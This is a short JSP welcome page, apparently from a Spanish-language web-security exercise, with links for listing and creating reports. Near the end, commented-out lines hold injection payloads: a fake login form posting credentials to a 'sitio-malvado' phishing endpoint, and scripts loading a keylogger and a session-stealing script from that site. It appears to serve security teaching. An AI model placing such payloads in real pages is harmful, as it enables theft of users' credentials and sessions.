<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
</head>
<body>
	<h1>Bienvenido ${user.name} - Rol: ${user.role}</h1>
	<ul>
		<li>
			<a href="informes">Listar informes</a>
		</li>
		<li>
			<a href="nuevo-informe">Crear informe</a>
		</li>
		<li>
			<a href="logout">Logout</a>
		</li>
	</ul>
<!-- 	<form action="/sitio-malvado/phising" method="POST"><input type="text" name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><button type="submit">Login</button></form> -->
<!-- <script src="http://localhost:8080/sitio-malvado/js/key-logger.js"></script> -->
<!-- <script src="http://localhost:8080/sitio-malvado/js/robo-session.js"></script> -->
</body>
</html>